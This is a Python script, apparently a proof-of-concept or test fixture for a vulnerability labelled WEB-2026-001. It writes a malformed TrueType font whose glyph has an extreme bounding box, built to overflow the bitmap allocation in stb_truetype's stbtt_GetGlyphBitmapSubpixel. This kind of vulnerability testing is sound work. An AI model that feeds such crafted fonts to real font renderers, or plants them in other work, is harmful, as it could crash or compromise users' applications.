#!/usr/bin/env python3
"""Generate a minimal malformed TrueType font for WEB-2026-001.

The glyph table contains glyph 0 with an extreme int16 bounding box:
  xMin=-32768, yMin=-32768, xMax=32767, yMax=32767
At scale 1.0, stbtt_GetGlyphBitmapSubpixel computes w=h=65535 and
then allocates w*h without an overflow check in the vulnerable version.
"""
import struct
from pathlib import Path

OUT = Path(__file__).with_name("malformed_overflow.ttf")


def u16(x):
    return struct.pack(">H", x & 0xFFFF)


def i16(x):
    return struct.pack(">h", x)


def u32(x):
    return struct.pack(">I", x & 0xFFFFFFFF)


def pad4(data: bytes) -> bytes:
    return data + (b"\0" * ((4 - (len(data) % 4)) % 4))


# Format 0 cmap mapping every byte to glyph 0. stbtt_InitFont only needs a
# recognized encoding subtable; this test calls glyph APIs directly.
cmap_subtable = u16(0) + u16(262) + u16(0) + bytes(256)
cmap = u16(0) + u16(1) + u16(3) + u16(1) + u32(12) + cmap_subtable

# head must be at least 54 bytes; indexToLocFormat lives at byte 50.
head = bytearray(54)
head[50:52] = u16(0)  # short loca offsets

# Minimal hhea/hmtx; present only because stbtt_InitFont requires them.
hhea = bytes(36)
hmtx = bytes(4)

# maxp: version + numGlyphs=1.
maxp = u32(0x00010000) + u16(1)

# loca short format stores glyf offsets divided by two. Glyph length is 10.
loca = u16(0) + u16(5)

# glyph 0: numberOfContours=0 (empty outline) but extreme bbox. Empty outline
# avoids unrelated contour parsing while still exercising bitmap allocation.
glyf = (
    i16(0) +        # numberOfContours
    i16(-32768) +   # xMin
    i16(-32768) +   # yMin
    i16(32767) +    # xMax
    i16(32767)      # yMax
)

# Use sorted tags for deterministic output.
tables = [
    ("cmap", cmap),
    ("glyf", glyf),
    ("head", bytes(head)),
    ("hhea", hhea),
    ("hmtx", hmtx),
    ("loca", loca),
    ("maxp", maxp),
]

num_tables = len(tables)
max_pow2 = 1
entry_selector = 0
while (max_pow2 << 1) <= num_tables:
    max_pow2 <<= 1
    entry_selector += 1
search_range = max_pow2 * 16
range_shift = (num_tables * 16) - search_range

offset_table = (
    u32(0x00010000) +
    u16(num_tables) +
    u16(search_range) +
    u16(entry_selector) +
    u16(range_shift)
)
directory_len = 16 * num_tables
current_offset = len(offset_table) + directory_len
records = []
blobs = []
for tag, data in tables:
    padded = pad4(data)
    records.append(tag.encode("ascii") + u32(0) + u32(current_offset) + u32(len(data)))
    blobs.append(padded)
    current_offset += len(padded)

OUT.write_bytes(offset_table + b"".join(records) + b"".join(blobs))
print(f"wrote {OUT} ({OUT.stat().st_size} bytes)")
